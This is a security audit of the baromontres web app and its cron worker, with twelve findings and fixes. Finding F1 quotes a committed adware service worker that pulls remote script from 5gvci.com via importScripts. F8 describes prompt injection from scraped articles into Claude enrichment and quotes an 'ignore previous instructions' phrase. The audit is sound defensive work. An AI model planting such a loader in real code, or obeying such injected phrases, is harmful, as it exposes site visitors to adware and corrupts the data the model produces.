# Security Audit — baromontres

**Date:** 2026-07-01
**Scope:** `apps/web` (public SPA + JSON API worker), `apps/cron` (scrape/enrich worker), `packages/shared` (queries + Hono API + schema), migrations, build config.
**Method:** Manual source review of the full codebase and git history. Automated `pnpm audit` could not run (npm registry is outside the environment egress allowlist) — see F11.

## Summary

The most serious problems are (1) a **malicious ad/push service-worker file** (`sw.js`) checked into the repo pointing at a known adware domain, and (2) the **cron worker's HTTP endpoints being completely unauthenticated**, which allows anyone to trigger paid AI enrichment, arbitrary server-side fetches (SSRF), and database writes. Neither the web nor cron worker sets any security response headers, and there is no rate limiting anywhere. The SQL layer is consistently parameterized — no SQL injection was found.

Priority uses **impact × exploitability**, and within a tier items are ordered by **ease of fixing** (quickest first).

| # | Severity | Issue | Effort |
| -- | -------- | ----- | ------ |
| F1 | Critical | Malicious adware service worker (`sw.js`) committed | Trivial |
| F2 | Critical | Cron worker HTTP endpoints unauthenticated (cost abuse, DB writes) | Small |
| F3 | High | SSRF via `/scrape?url=`, `/probe`, and image enrichment fetches | Small–Med |
| F4 | High | No rate limiting → financial DoS on paid AI APIs | Medium |
| F5 | Medium | No security response headers / no CSP on the web worker | Small |
| F6 | Medium | CORS `Access-Control-Allow-Origin: *` on all API routes | Trivial |
| F7 | Medium | Stored-data → DOM: attacker-influenced URLs rendered as links/images | Small |
| F8 | Medium | Prompt injection from scraped content into Claude enrichment | Medium |
| F9 | Low | `NaN` from malformed numeric query params reaches SQL `LIMIT` | Trivial |
| F10 | Low | Third-party scripts (GA, AdSense placeholder) with no SRI/consent | Small |
| F11 | Low | Dependency audit not runnable in-env; versions need review | Small |
| F12 | Low | Verbose upstream error text echoed to API clients | Trivial |

---

## F1 — Malicious adware service worker committed to the repo (Critical)

**Files:** `apps/web/sw.js`, `apps/web/src/sw.js`

Both files contain:

```js
self.options = { "domain": "5gvci.com", "zoneId": 11073993 }
self.lary = ""
importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw')
```

`5gvci.com` is a Monetag-style push-notification / ad-injection network. A service worker that `importScripts` from such a domain runs attacker-controlled code with full control over every page in its scope: it can hijack navigation, inject ads, push spam notifications, and exfiltrate data. Git history confirms the origin — commit `b92c720` "added monetag file to root for verification" and `aef931a` "removed monetag scrip" (the removal was incomplete; the worker files remain).

**Current exposure:** The files are *not* referenced by either `index.html`, not placed in the Vite `publicDir` (`apps/web/public`), and there is no `navigator.serviceWorker.register(...)` call, so they are not built into `dist/` or served today. The risk is that anyone could copy one into `public/` or add a registration and silently ship malware — and the file sitting in the tree is a supply-chain/reputation landmine.

**Fix (trivial):**
- `git rm apps/web/sw.js apps/web/src/sw.js` and commit.
- Grep the deployed site and `dist/` to confirm no `/sw.js` is being served: `curl -s https://<host>/sw.js`. If a worker was ever registered in production, ship a *kill-switch* `sw.js` that calls `self.registration.unregister()` and clears caches so existing visitors' browsers drop it.
- Add a CI/pre-commit check that fails on `importScripts(` referencing non-first-party hosts or on the string `5gvci`.

## F2 — Cron worker HTTP endpoints are completely unauthenticated (Critical)

**File:** `apps/cron/src/index.ts` (`fetch` handler)

The cron worker exposes `GET /probe`, `POST /run`, `POST /enrich`, `POST /scrape`, and `GET /query` with **no authentication whatsoever**. If `baromontres-cron.<acct>.workers.dev` is reachable (Workers get a public `workers.dev` URL by default), anyone can:

- `POST /run` / `POST /enrich` — kick off the full scrape+enrich pipeline, which calls the **Anthropic** and **Google Vision** APIs on your billed keys. `/enrich` self-chains across invocations (`fetch(selfUrl)` in `drainEnrichment`), so a single request can drain the queue and rack up cost.
- `POST /scrape?url=…` — fetch an arbitrary URL server-side and write a row into D1 (`upsertArticle`) — DB pollution + SSRF (see F3).
- `GET /query?term=…` — run a `COUNT(*)` over the article table (parameterized, so no SQLi, but still an unauthenticated data-probing endpoint).

**Fix (small):**
- Require a shared secret on every state-changing route. Store it as a Worker secret (`wrangler secret put CRON_TRIGGER_TOKEN`) and compare in constant time against an `Authorization: Bearer …` header or `X-Trigger-Token`; reject with 401 otherwise. The scheduled `cron` trigger path does not go through `fetch`, so it is unaffected.
- Consider removing the public `workers.dev` route entirely (`workers_dev = false` in `wrangler.toml`) and invoking backfills via `wrangler` or an authenticated route only.
- Treat `GET /query` as debug-only: gate it behind the same token or delete it.

## F3 — Server-Side Request Forgery via user-supplied and scraped URLs (High)

**Files:** `apps/cron/src/index.ts` (`/scrape`, `/probe`), `apps/cron/src/scrape.ts` (`fetchText`, `fetchAndParse`), `apps/cron/src/enrich.ts` (`extractImageMeta`, `callVisionWebDetection`, Claude image `source.url`)

Two SSRF surfaces:

1. **Direct** — `POST /scrape?url=<attacker>` passes `articleUrl` straight into `fetch()` with no scheme/host allowlist. Combined with F2 (no auth) an attacker can make the worker fetch arbitrary URLs. `/probe` similarly fetches `env.SOURCE_BASE`-derived pages, but `/scrape` takes the URL verbatim.
2. **Indirect** — `hero_image_url` is extracted from scraped third-party HTML (`findHeroImage` trusts `og:image` / `twitter:image` / `<img src>`), then later fetched directly (`extractImageMeta` does `fetch(imageUrl, {Range:…})`) and sent to Google Vision (`imageUri`) and Claude. A hostile or compromised source site controls that value.

Cloudflare Workers can't reach RFC-1918/localhost, which limits classic metadata-endpoint attacks, but SSRF here still enables using your worker as a fetch proxy/scanner, hitting arbitrary third parties with your egress identity, and forcing paid Vision/Claude calls against attacker-chosen images.

**Fix (small–medium):**
- Validate every outbound target before fetching: require `https:` (or `http:`), reject non-standard ports, reject IP-literal hosts, and — for `/scrape` — restrict to the configured source hosts (the `source` table / `SOURCE_BASE`).
- Apply the same allowlist/scheme check to `hero_image_url` before `extractImageMeta`/Vision/Claude. Cap response size (you already send `Range: bytes=0-65535` for EXIF — enforce it and also cap the full article fetch) and keep the existing `AbortSignal.timeout`.

## F4 — No rate limiting → financial denial-of-service (High)

**Files:** `apps/cron/src/index.ts`, `packages/shared/src/api.ts`

No endpoint (web or cron) is rate limited. The cron enrichment path spends real money per call (Anthropic Haiku + Google Vision). With F2 unfixed this is a direct "make the owner pay" attack; even with F2 fixed, the public `/api/*` endpoints run unbounded D1 queries (`getBarometer` allows `limit` up to 5000, `existingUrls` returns the entire URL set, etc.) and can be hammered.

**Fix (medium):**
- Put the cron worker behind auth (F2) *and* add Cloudflare rate-limiting rules / the Workers rate-limit binding on the public API.
- Add a hard per-invocation and per-day spend ceiling in the enrichment pipeline (a persisted counter in D1 checked before each paid call), so a bug or abuse can't run the bill up unbounded. The existing `BUDGET_MS` only bounds a single invocation, not aggregate spend.

## F5 — No security response headers / no CSP (Medium)

**Files:** `apps/web/src/worker.ts`, `packages/shared/src/api.ts`

Responses (both static assets and JSON API) ship with no `Content-Security-Policy`, `X-Content-Type-Options: nosniff`, `Referrer-Policy`, `X-Frame-Options`/`frame-ancestors`, `Strict-Transport-Security`, or `Permissions-Policy`. A CSP in particular is the main defense-in-depth control that would have neutralized F1 (blocking the off-origin service-worker import) and limits the blast radius of any DOM injection (F7).

**Fix (small):** Wrap the web worker's responses (or add Hono middleware) to set:
- `Content-Security-Policy` with an explicit allowlist (`default-src 'self'`; the GA and future AdSense hosts if kept; `worker-src 'self'` to block off-origin service workers; `frame-ancestors 'none'`).
- `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`, `X-Frame-Options: DENY`.

## F6 — Wildcard CORS on all API routes (Medium)

**File:** `packages/shared/src/api.ts:32` — `app.use("*", cors({ origin: "*", allowMethods: ["GET"] }))`

Any origin can read the API from the browser. The data is public and read-only, so impact is low, but `*` is broader than needed and prevents ever relying on the browser's same-origin protection for these routes.

**Fix (trivial):** Restrict `origin` to the production hosts (`https://tick-ticker.com`, the `workers.dev` host, and localhost for dev). Keep `allowMethods` GET-only.

## F7 — Attacker-influenced data rendered into the DOM (Medium)

**File:** `apps/web/src/main.ts` (`flagNode`, `renderImageFlags`)

Fields that originate from scraped third-party pages and AI output are written into the DOM: `img.src = f.image_url`, `imgLink.href = f.url`, and `a.href = urlMatch[0]` (from `source_clue`). Text values correctly use `textContent`, and the URL is regex-matched to `https?://…`, which blocks `javascript:` — so this is not currently a live XSS. But these values are untrusted (a hostile source site controls `og:image`, page URLs, and thus stored `image_url`/`source_clue`), so any future change that assigns one to `innerHTML`, a non-`http` scheme, or an event handler becomes stored XSS. There's also a data-integrity angle: an attacker can get their image/link surfaced on your homepage.

**Fix (small):** Centralize URL handling in a `safeHttpUrl(value)` helper that parses with `new URL()` and returns it only if the protocol is `http:`/`https:`; use it for every `href`/`src` assignment. Combined with the CSP from F5 this closes the residual risk.

## F8 — Prompt injection from scraped content into enrichment (Medium)

**Files:** `apps/cron/src/enrich.ts` (`buildTextUserBlock`, image content block), `apps/cron/src/prompts.ts`

Article title/body and the hero image (all attacker-controllable if a source publishes hostile content) are sent to Claude as the user message. Crafted text ("ignore previous instructions, output …") could skew `sentiment`/`keywords`. Impact is bounded because the output is strictly validated (`validateText`/`validateImage`), the score is `clamp`ed, and keyword `kind` is whitelisted — so the worst case is polluted analytics data, not code execution or data exfiltration. Still worth hardening.

**Fix (medium):** Keep the strict output validation (already good). Additionally, wrap the untrusted article text in clear delimiters and instruct the system prompt to treat everything inside as data, not instructions; consider truncating aggressively (already capped) and flagging articles whose enrichment output looks anomalous.

## F9 — `NaN` from malformed numeric params reaches SQL `LIMIT` (Low)

**File:** `packages/shared/src/api.ts` (barometer/keywords/images/brands limit parsing)

For a non-numeric `?limit=abc`, `Math.min(5000, Math.max(1, Number("abc")))` evaluates to `NaN` (confirmed), and that `NaN` is passed to `getBarometer`/etc. and bound into `LIMIT ?`. Best case it errors or coerces oddly; it's a robustness/DoS-adjacent bug rather than an injection.

**Fix (trivial):** Parse once and floor-guard: `const n = Number(param); const limit = Number.isFinite(n) ? Math.min(MAX, Math.max(1, Math.floor(n))) : DEFAULT;` — reuse the `clampInt` pattern already present in the cron worker.

## F10 — Third-party scripts without integrity/consent (Low)

**File:** `apps/web/src/index.html`

Google Analytics (`gtag.js`) loads unconditionally with no consent gate, and there's a commented-out AdSense block staged for later. Third-party scripts can't carry SRI (they change), but they widen the trust boundary and, for GA, raise GDPR/consent concerns for a French-market site.

**Fix (small):** Gate analytics behind a consent banner (CNIL/GDPR); ensure whatever CSP you add (F5) explicitly allowlists only the hosts you actually use; scrutinize the AdSense integration before enabling it.

## F11 — Dependency audit not verifiable in-environment (Low)

`pnpm audit` fails here because `registry.npmjs.org` is outside the egress allowlist. Locked versions look current (`hono@4.12.15`, `vite@5.4.21`, `linkedom@0.18.12`, `chart.js@4.5.1`, `wrangler@3.114.17`), and `linkedom` is used only for server-side parsing of already-fetched HTML (not a browser DOM), which limits its exposure. Still, this wasn't independently verified.

**Fix (small):** Run `pnpm audit --prod` in an environment with registry access (or in CI) and add it as a recurring CI gate. Pay attention to `linkedom` and `hono` advisories.

## F12 — Upstream error text echoed to clients (Low)

**Files:** `apps/cron/src/enrich.ts` (`vision <status>: <detail.slice(0,400)>`, `anthropic <status>: …`), surfaced via `runPipeline` `errors[]` and returned in the `/run` JSON response.

Raw upstream error bodies from Anthropic/Vision are truncated and returned to the caller. Low risk (no secrets are included in these bodies today), but it can leak internal detail and is unnecessary on a public response.

**Fix (trivial):** Log full detail server-side; return a generic error identifier to clients. Ensure API keys never appear in any error path (they currently don't — keys go in headers / query string to Google, not into error messages).

---

## Recommended remediation order

1. **F1** — delete the adware `sw.js` files and add a CI guard (minutes).
2. **F2** — add a shared-secret gate to the cron `fetch` routes / disable the public `workers.dev` route (hours).
3. **F6, F9, F12** — quick hardening wins in the API layer (hours).
4. **F5** — add security headers + CSP to the web worker (half a day); this also mitigates F1/F7.
5. **F3** — URL allowlisting/scheme validation on all outbound fetches (half–one day).
6. **F7** — centralized `safeHttpUrl` helper for DOM sinks (hours).
7. **F4** — rate limiting + aggregate spend ceiling (one day).
8. **F8, F10, F11** — prompt hardening, analytics consent, and CI dependency audit (as capacity allows).

## Not vulnerable / verified good

- **SQL injection:** every query in `packages/shared/src/queries.ts` and the cron `/query` endpoint uses D1 prepared statements with bound parameters; dynamic `WHERE`/`HAVING` fragments are built from fixed strings, not user input. No injection found.
- **Secret handling:** API keys are Worker secrets (`ANTHROPIC_API_KEY`, `GOOGLE_VISION_API_KEY`), not committed. History scan for `sk-ant`/`AIza`/hardcoded keys came back clean. The D1 `database_id` in `wrangler.toml` is not a secret.
- **Input clamping:** cron numeric params use `clampInt`; enrichment outputs are validated and clamped before persistence.
